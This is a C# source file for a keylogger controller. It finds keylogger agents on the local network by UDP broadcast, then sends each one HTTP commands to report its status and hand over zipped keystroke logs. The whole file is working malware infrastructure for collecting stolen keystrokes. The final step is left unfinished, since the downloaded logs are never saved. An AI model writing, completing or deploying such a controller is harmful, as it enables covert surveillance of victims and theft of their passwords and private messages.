using System.Net;
using System.Net.Sockets;
using System.Collections;
using System.Collections.Generic;

namespace Local_Keylogger_Controller
{
    internal class Program
    {
        public const int DiscoveryPort = 5001;
        private const string DiscoveryMessage = "DISCOVER_AGENT";
        private const uint ReciveTimeoutMs = 3000; // 3 seconds

        static async Task Main(string[] args)
        {
            Console.WriteLine("Starting Local Keylogger Controller...");

            using UdpClient udpClient = new UdpClient();
            udpClient.EnableBroadcast = true;

            byte[] payload = System.Text.Encoding.UTF8.GetBytes(DiscoveryMessage);
            IPEndPoint endPoint = new IPEndPoint(IPAddress.Broadcast, DiscoveryPort);

            await udpClient.SendAsync(payload, payload.Length, endPoint);
            Console.WriteLine($"Discovery message sent to {endPoint.Address} : {DiscoveryPort}");

            //Step 2: We receive responses from agents within ReceiveTimeoutMs milliseconds.

            var discoveryAgents = new List<(string Ip, int Port)>();
            var startTime = DateTime.UtcNow;

            Console.WriteLine($"Waiting for responses from agents for {ReciveTimeoutMs} ms...");

            while ((DateTime.UtcNow - startTime).TotalMilliseconds < ReciveTimeoutMs)
            {
                var timeLeft = ReciveTimeoutMs - (int)(DateTime.UtcNow - startTime).TotalMilliseconds;
                if(timeLeft <= 0) break;

                var receiveTask = udpClient.ReceiveAsync();
                var timeoutTask = Task.Delay((int)timeLeft);

                var completedTask = await Task.WhenAny(receiveTask, timeoutTask);
                if(completedTask == timeoutTask)
                {
                    Console.WriteLine("No more responses received, exiting...");
                    break;
                }

                // If we received a response, process it
                var rusults = receiveTask.Result;
                string text = System.Text.Encoding.UTF8.GetString(rusults.Buffer);
                Console.WriteLine($"Received response from {rusults.RemoteEndPoint.Address} : {rusults.RemoteEndPoint.Port} - {text}");
            
                var parts = text.Split(':');
                if(parts.Length == 3 && parts[0].Trim() == "AGENT_RESPONSE")
                {
                    string ipPart = parts[1].Trim();
                    string portPart = parts[2].Trim()
                        .Replace("Port", "")
                        .Trim();

                    if(int.TryParse(portPart, out int port))
                    {
                        discoveryAgents.Add((ipPart, port));
                        Console.WriteLine($"Discovered agent at {ipPart} : {port}");
                    }
                    else
                    {
                        Console.WriteLine($"Invalid port received: {portPart}");
                    }
                }
                else
                {
                    Console.WriteLine($"Invalid response format: {text}");
                }
            }

            if(discoveryAgents.Count == 0)
            {
                Console.WriteLine("No agents discovered.");
                return;
            }
            else
            {
                Console.WriteLine($"Discovered {discoveryAgents.Count} agents:");
                foreach (var agent in discoveryAgents)
                {
                    Console.WriteLine($"- {agent.Ip} : {agent.Port}");
                }

                using (var client = new HttpClient { Timeout = TimeSpan.FromSeconds(2)})
                {
                    foreach (var agent in discoveryAgents)
                    {
                        var url = $"http://{agent.Ip}:{agent.Port}/?action=info";
                        Console.Write($"-> {agent.Ip} : {agent.Port} - Sending start command... ");

                        try
                        {
                            string response = await client.GetStringAsync(url);
                            Console.WriteLine($"OK: \"{response}\"");

                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error sending command to {agent.Ip} : {agent.Port} - {ex.Message}");
                        }
                    }
                    foreach ( var (ip, port) in discoveryAgents)
                    {
                        var url = $"http://{ip}:{port}/?action=getkeylogs";
                        Console.Write($"-> {ip} : {port} - Sending get key log... ");

                        try
                        {
                            byte[] zipBytes = await client.GetByteArrayAsync(url);

                            string outPatch = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                            string patchCombine = Path.Combine(outPatch, $"keylog_{ip}_{port}.zip");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error sending command to {ip} : {port} - {ex.Message}");
                        }
                    }
                }
            }

            Console.WriteLine("\nController work complete. Press any key to exit.");
            Console.ReadKey();
        }
    }
}
